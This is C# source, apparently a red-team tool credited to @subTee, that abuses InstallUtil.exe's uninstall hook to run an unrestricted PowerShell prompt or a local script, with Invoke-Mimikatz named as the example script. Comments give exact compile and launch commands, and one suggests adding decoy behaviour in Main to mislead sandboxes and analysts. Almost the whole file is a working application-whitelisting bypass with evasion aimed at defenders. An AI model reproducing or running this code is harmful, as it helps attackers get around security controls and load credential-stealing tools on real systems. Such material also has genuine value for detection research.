using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
 
/*
Author: Casey Smith, Twitter: @subTee
 
License: BSD 3-Clause
Step One: 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:pshell.dll pshell.cs
OR 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Program Files\Reference Assemblies\Microsoft\WindowsPowerShell\v1.0\System.Management.Automation.dll" /out:pshell.dll pshell.cs
 
Step Two:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U pshell.dll
 
[Optional] Add Local Script Path
/ScriptPath="C:\Tools\Invoke-Mimikatz.ps1"  
 
 
*/
 
public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
         
    }
     
}
 
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        //Console.BackgroundColor = ConsoleColor.DarkBlue;
        //Console.ForegroundColor = ConsoleColor.White;
        if(Context.Parameters["ScriptPath"] != null) 
            {
                string s = File.ReadAllText(Context.Parameters["ScriptPath"]);
                RunPSFile(s);
            }
         
        while(true)
        {
             
            Console.Write("PS >");
            string x = Console.ReadLine();
            try
            {
                Console.WriteLine(RunPSCommand(x));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
         
    }
     
    //Based on Jared Atkinson's And Justin Warner's Work
    public static string RunPSCommand(string cmd)
    {
        //Init stuff
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();
 
        //Add commands
        pipeline.Commands.AddScript(cmd);
 
        //Prep PS for string output and invoke
        pipeline.Commands.Add("Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        runspace.Close();
 
        //Convert records to strings
        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
     }
      
     public static void RunPSFile(string script)
    {
        PowerShell ps = PowerShell.Create();
        ps.AddScript(script).Invoke();
    }
}